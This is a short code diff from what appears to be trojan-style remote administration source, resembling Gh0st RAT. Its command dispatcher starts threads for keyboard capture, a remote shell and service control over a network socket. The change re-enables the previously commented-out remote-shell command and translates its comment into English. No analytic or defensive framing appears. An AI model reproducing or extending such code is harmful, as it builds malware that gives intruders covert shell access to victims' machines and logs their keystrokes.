@@ -51,10 +51,10 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		break;
-// 	case COMMAND_SHELL: // 远程终端
-// 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager,
-// 			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
-// 		break;
+	case COMMAND_SHELL: // remote shell
+		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager,
+			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
+		break;
 	case COMMAND_SERVICE_MANAGER://服务管理
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ServiceManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
